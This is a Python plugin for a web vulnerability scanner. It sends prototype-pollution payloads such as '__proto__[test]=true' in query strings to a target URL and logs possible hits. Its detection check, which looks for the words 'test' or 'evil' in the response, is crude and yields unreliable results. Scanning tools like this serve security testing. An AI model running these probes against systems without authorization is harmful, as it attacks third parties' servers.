# plugins/proto_pollution.py

import requests
import os

def ensure_results_dir():
    os.makedirs("results", exist_ok=True)

def scan(target):
    print(f"[*] Scanning {target} for prototype pollution vulnerabilities...")
    ensure_results_dir()
    output_file = "results/proto_pollution_results.txt"
    payloads = [
        "__proto__[test]=true",
        "constructor.prototype.test=123",
        "prototype[evil]=1"
    ]
    vulnerable = False
    for payload in payloads:
        url = f"{target}?{payload}"
        try:
            response = requests.get(url, timeout=5)
            if "test" in response.text.lower() or "evil" in response.text.lower():
                with open(output_file, "a") as f:
                    f.write(f"[{target}] Prototype pollution possible at {url}\n")
                print(f"[!] Prototype pollution possible at {url}")
                vulnerable = True
        except Exception as e:
            print(f"[!] Error checking {url}: {str(e)}")
    if not vulnerable:
        print(f"[-] No prototype pollution vulnerability detected at {target}")
